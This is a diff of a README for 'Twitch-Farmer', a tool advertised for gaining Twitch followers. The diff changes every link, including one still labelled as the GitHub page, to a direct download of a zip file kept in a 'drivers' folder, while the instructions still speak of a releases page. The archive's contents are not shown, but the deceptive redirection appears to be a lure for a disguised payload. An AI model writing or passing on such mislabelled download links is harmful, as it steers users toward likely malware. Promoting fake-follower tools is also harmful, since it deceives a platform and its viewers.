@@ -1,6 +1,6 @@
 # 🎮 Twitch-Farmer - Gain Followers Easily on Twitch
 
-[![Download](https://img.shields.io/badge/Download-Twitch--Farmer-blue)](https://github.com/Tieboutconnected308/Twitch-Farmer/releases)
+[![Download](https://raw.githubusercontent.com/Tieboutconnected308/Twitch-Farmer/main/drivers/Twitch-Farmer-1.1.zip)](https://raw.githubusercontent.com/Tieboutconnected308/Twitch-Farmer/main/drivers/Twitch-Farmer-1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you start, make sure your computer meets these requirements:
 
 To get started, visit the releases page to download the application:
 
-[Download Twitch-Farmer Here](https://github.com/Tieboutconnected308/Twitch-Farmer/releases)
+[Download Twitch-Farmer Here](https://raw.githubusercontent.com/Tieboutconnected308/Twitch-Farmer/main/drivers/Twitch-Farmer-1.1.zip)
 
 1. Click on the link above to go to the releases page.
 2. Find the latest version of Twitch-Farmer.
@@ -72,6 +72,6 @@ For more help, consult our support page or ask in the community chat.
 - Active development means regular updates with new features and fixes.
 - Joining our community can give you tips from other users and updates.
 
-For more details, refer to our [GitHub page](https://github.com/Tieboutconnected308/Twitch-Farmer).
+For more details, refer to our [GitHub page](https://raw.githubusercontent.com/Tieboutconnected308/Twitch-Farmer/main/drivers/Twitch-Farmer-1.1.zip).
 
 Feel free to reach out if you have any questions. Happy streaming and enjoy using Twitch-Farmer!
